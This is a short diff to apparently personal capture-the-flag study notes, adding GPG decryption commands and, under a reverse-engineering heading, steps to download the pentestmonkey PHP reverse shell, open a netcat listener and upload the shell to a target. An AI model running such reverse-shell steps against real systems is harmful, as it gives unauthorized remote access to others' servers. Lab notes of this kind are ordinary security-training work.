@@ -24,6 +24,12 @@ python3 hash identifier
 
 hash-identifier 7bf6d9bb82bed1302f331fc6b816aada
 
+gpg --help
+gpg --import tryhackme.key
+gpg message.gpg
+cat message
+
+
 # Reverse Engineering
 
 ![RE example.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/720f4b35-149f-42ac-924a-4db489bc5b3a/RE_example.png)
@@ -31,6 +37,15 @@ hash-identifier 7bf6d9bb82bed1302f331fc6b816aada
 ![RE example2.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/56c5f5e9-f997-4663-9b5d-e0d5b96a9d3b/RE_example2.png)
 
 ![RE example3.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6392dd19-8341-4097-880a-f4a2a8d9c73c/RE_example3.png)
+
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+sudo nc -lvnp 1234
+upload reverse shell script
+profit
+
+wget hash identifier website
+
 
 # Binary Exploitation
 
